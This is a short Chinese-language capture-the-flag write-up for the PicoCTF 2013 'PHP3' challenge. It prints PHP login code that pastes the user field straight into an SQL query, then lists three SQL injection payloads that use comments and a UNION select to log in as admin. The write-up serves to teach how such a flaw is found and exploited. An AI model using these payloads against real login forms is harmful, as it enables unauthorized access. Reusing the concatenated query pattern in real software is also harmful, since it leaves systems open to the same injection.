## PicoCTF 2013:PHP3

**分类：**脚本开发

## write-up

根据提示，我们可以访问`code.txt`该文件

```php
<?php
        if($_POST['user'] && $_POST['pass']) {
            mysql_connect("localhost", "root", "ctfhub") or die("Could not connect:" . mysql_error());
			mysql_select_db("ctfhub");
            $user = $_POST['user'];
            $pass = md5($_POST['pass']);
			$sql="select user from ctfhub where (user='$user') and (pw='$pass')";
			$result = mysql_query($sql);
            $query = @mysql_fetch_array($result);

            if($query['user']=="admin") {
                echo "<p>Logged in! Key:XXXXXXXX";
            }

            if($query['user']!="admin") {
                echo("<p>You are not admin!</p>");
            }
        }
    ?>
```

对于这道题目我们可以简单地修改将user参数就可以完成。这道题目以用户名和密码作为通行证。我们通过注释的方式将sql语句的语义改变就可以完成挑战。

`payload1:user=') UNION select user from ctf where (user='admin') #&pass=11`

`payload2:user=admin')#&pass=1`

`payload3:user=') union select 'admin'#&pass=1`





